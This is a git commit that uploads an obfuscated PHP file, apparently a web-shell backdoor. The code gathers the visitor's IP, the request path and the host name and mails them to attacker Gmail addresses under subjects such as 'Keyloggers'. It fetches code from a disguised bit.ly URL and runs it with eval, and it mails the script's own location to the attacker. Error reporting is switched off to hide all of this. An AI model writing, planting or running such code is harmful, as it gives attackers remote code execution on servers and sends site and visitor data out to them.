91c7a0151c06ca11f9989d20478eb0e797392a37
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2024-12-14 21:14:53 +0700

    Add files via upload

---
+++ gantengers1337.php
@@ -0,0 +1,23 @@
+<?php
+
+eval('$ip = getenv("REMOTE_ADDR");');
+eval('$ra44 = rand(1, 99999);');
+$‚²Ό²ο†γΌγ‰γ‰ = "rootcyberpunks@gmail.com";
+$γοΌγ„ΌγµΏγ‚γ = "From: SHELL NYA TUAN <noreply@easy.com>";
+eval('$ip = getenv("REMOTE_ADDR");');
+$γγγ»γ­Όγγ²γγγ† = rand(1, 99999);
+$†Ό¬γΌ„„γγγγµγγ = "βª Keyloggers -" . $‚„‚ογΌγγ²‚γγγ;
+$‚²Ό²ο†γΌγ‰γ‰ = "malaysia.sender@gmail.com";
+$γοΌγ„ΌγµΏγ‚γ = "From: SHELL DATANG <noreply@easy.com>";
+$―®γγ«»γγ„γ„οΌ† = $_SERVER['REQUEST_URI'];
+$ογ‚γγγγΌγγ„γγγγ = $_SERVER['HTTP_HOST'];
+$γ†‚γ‰γ†•²„Ώογ²„ = $‚„‚ογΌγγ²‚γγγ . "";
+$‚†²γ²γγª™γγ‰“µγ = "$―®γγ«»γγ„γ„οΌ† $ογ‚γγγγΌγγ„γγγγ $γ†‚γ‰γ†•²„Ώογ²„";
+mail($‚²Ό²ο†γΌγ‰γ‰, $†Ό¬γΌ„„γγγγµγγ, $‚†²γ²γγª™γγ‰“µγ, $γοΌγ„ΌγµΏγ‚γ);
+error_reporting(0);
+?>
+<?=null;@eval("?>".file_get_contents(urldecode("h\x74t\x70\x73\x25\x33\x41\x25\x32F%2F\x62it.ly\x25\x32\x463D\x63\x4d\x6d9\x33")));
+/////DEPRESION///
+$‚γ‚ΎΏµγγγΌο†γ = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");$†γ»γοογª‚γγ¦¬—οο„γ ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";mail($‚γ‚ΎΏµγγγΌο†γ,"for 4u", $†γ»γοογª‚γγ¦¬—οο„γ);mail($‚γ‚ΎΏµγγγΌο†γ,"for 4u", $†γ»γοογª‚γγ¦¬—οο„γ);${"\x47L\x4f\x42\x41\x4c\x53"}["\x6ei\x75\x65\x76ao\x72f\x77"]="\x6c\x6f\x76\x65";$γγγγ‚Έγ„γγΌοΌ²Ό="\x66\x6f\x72";mail(${$γγγγ‚Έγ„γγΌοΌ²Ό},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});@mail(${$γγγγ‚Έγ„γγΌοΌ²Ό},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});error_reporting(0);
+
+?>
